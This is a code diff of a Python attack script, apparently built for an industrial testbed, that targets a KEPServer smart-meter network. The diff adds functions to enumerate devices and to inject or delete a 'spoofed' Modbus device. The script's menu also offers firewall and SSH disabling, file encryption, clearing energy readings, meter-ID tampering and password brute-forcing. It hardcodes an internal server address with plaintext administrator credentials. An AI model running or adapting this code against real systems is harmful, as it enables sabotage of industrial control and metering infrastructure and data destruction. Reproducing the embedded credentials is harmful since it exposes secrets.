@@ -3,17 +3,17 @@ from psutil import process_iter
 import signal
 import base64
 from pathlib import Path
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP, AES
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Cipher import PKCS1_OAEP, AES
 from shutil import copyfile
 from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
-from ctypes import windll
+#import ctypes
 from sys import executable, argv
-from win32netcon import ACCESS_ALL
-from win32net import NetShareAdd
+#from win32netcon import ACCESS_ALL
+#from win32net import NetShareAdd
 from time import sleep
-from win32console import GetConsoleWindow
-from win32gui import ShowWindow
+#from win32console import GetConsoleWindow
+#from win32gui import ShowWindow
 import kepconfig
 import pkgutil
 from kepconfig import connection, admin, connectivity
@@ -43,16 +43,16 @@ POWERSHELL_SCRIPT_PATH = r"Powershell\baseScriptElevated.ps1"
 ###########
 
 # Check if the script is running with administrator privileges, if not, restart with elevated privileges
-def check_admin() -> None:
-    """
-    Check if script is running wit admin privilege. Else, restart as admin.
-    """
-    try:
-        isAdmin = windll.shell32.IsUserAnAdmin()
-    except AttributeError:
-        isAdmin = False
-    if not isAdmin:
-        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
+# def check_admin() -> None:
+#     """
+#     Check if script is running wit admin privilege. Else, restart as admin.
+#     """
+#     try:
+#         isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
+#     except AttributeError:
+#         isAdmin = False
+#     if not isAdmin:
+#         ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
 
 # Delete files in a specific folder
 def delete_files(folder_path):
@@ -106,37 +106,37 @@ def copy_file(folder_path):
         print("\nFail.\n")
 
 #Create Shared Folder
-def create_shared_folder():
-    try:
-        folder_path = r'C:\Windows\temp\Smartmeter'
+# def create_shared_folder():
+#     try:
+#         folder_path = r'C:\Windows\temp\Smartmeter'
 
-        # Create the folder if it does not already exist
-        if not path.exists(folder_path):
-            mkdir(folder_path)
+#         # Create the folder if it does not already exist
+#         if not path.exists(folder_path):
+#             mkdir(folder_path)
 
-        netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
-        if "SmartMeterfolder" in netshare.stdout:
-            print ("SmartMeterfolder has already been shared.")
-        else:
-            # Set the share information
-            share_name = 'SmartMeterfolder'
-            share_path = folder_path
-            share_remark = 'Shared folder for full access'
+#         netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
+#         if "SmartMeterfolder" in netshare.stdout:
+#             print ("SmartMeterfolder has already been shared.")
+#         else:
+#             # Set the share information
+#             share_name = 'SmartMeterfolder'
+#             share_path = folder_path
+#             share_remark = 'Shared folder for full access'
 
-            # Create the share
-            share_info = {
-                'netname': share_name,
-                'path': share_path,
-                'remark': share_remark,
-                'max_uses': -1,
-                'current_uses': 0,
-                'permissions': ACCESS_ALL,
-                'security_descriptor': None
-            }
-            NetShareAdd(None, 2, share_info)
-            print ("SmartMeterfolder has been shared.")
-    except Exception as e:
-        print("\nFail.\n")
+#             # Create the share
+#             share_info = {
+#                 'netname': share_name,
+#                 'path': share_path,
+#                 'remark': share_remark,
+#                 'max_uses': -1,
+#                 'current_uses': 0,
+#                 'permissions': ACCESS_ALL,
+#                 'security_descriptor': None
+#             }
+#             NetShareAdd(None, 2, share_info)
+#             print ("SmartMeterfolder has been shared.")
+#     except Exception as e:
+#         print("\nFail.\n")
 
 # Disable the firewall
 def disable_firewall():
@@ -1107,7 +1107,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 def kep_connect():
     # 172.16.2.77 if at lv 7
     # 172.16.2.223 if at lv 6
-    server = connection.server(host = '172.16.2.223', port = 57412, user = 'Administrator', pw = 'administrator2022')
+    server = connection.server(host = '172.16.2.77', port = 57412, user = 'Administrator', pw = 'administrator2022')
     print("Connected to KEP server.")
     return server
 
@@ -1130,6 +1130,27 @@ def kep_disable_user(user):
 def kep_get_single_user(user):
     server = kep_connect()
     print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)
+
+def kep_get_all_channel():
+    server = kep_connect()
+    print(json.dumps(connectivity.channel.get_all_channels(server), indent=4))
+
+def kep_get_all_device():
+    server = kep_connect()
+    print(json.dumps(connectivity.device.get_all_devices(server, "SmartMeter"), indent=4))
+
+def kep_get_single_device():
+    server = kep_connect()
+    print(json.dumps(connectivity.device.get_device(server, "SmartMeter.ministicHACKED"), indent=4))
+
+def kep_add_spoofed_device():
+    server = kep_connect()
+    print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, "SmartMeter", {"common.ALLTYPES_NAME": "Device69", "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial", "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
+    print("\n" + json.dumps(connectivity.device.get_device(server, "SmartMeter.Device69"), indent=4))
+
+def kep_delete_spoofed_device():
+    server = kep_connect()
+    print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, "SmartMeter.Device69"), indent=4))
 
 def disable_running_schedules() -> None:
     cp = run(["schtasks", "/change", "/TN", "\MoveFiles", "/disable"], stdout=PIPE, check=False)
@@ -1167,12 +1188,12 @@ def kep_server_stop():
 if __name__ == '__main__':
     attack_option = str(argv[1])
     
-    if attack_option != "1":
-        check_admin()
+    # if attack_option != "1":
+    #     check_admin()
 
     match attack_option:
         case "1":  create_scheduled_task() 
-        case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
+        #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
         case "3":  disable_firewall()
         case "4":  disable_ssh()
         case "5":  disable_kepserver()
@@ -1191,6 +1212,11 @@ if __name__ == '__main__':
         case "18": kep_disable_user("User1")
         case "19": kep_get_single_user("User1")
         case "20": disable_running_schedules()
+        case "21": kep_get_all_channel()
+        case "22": kep_get_all_device()
+        case "23": kep_get_single_device()
+        case "24": kep_delete_spoofed_device()
+        case "25": kep_add_spoofed_device()
         case "-h":
             print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
         case _: print("Invalid Option! Use option \"-h\" for help!")
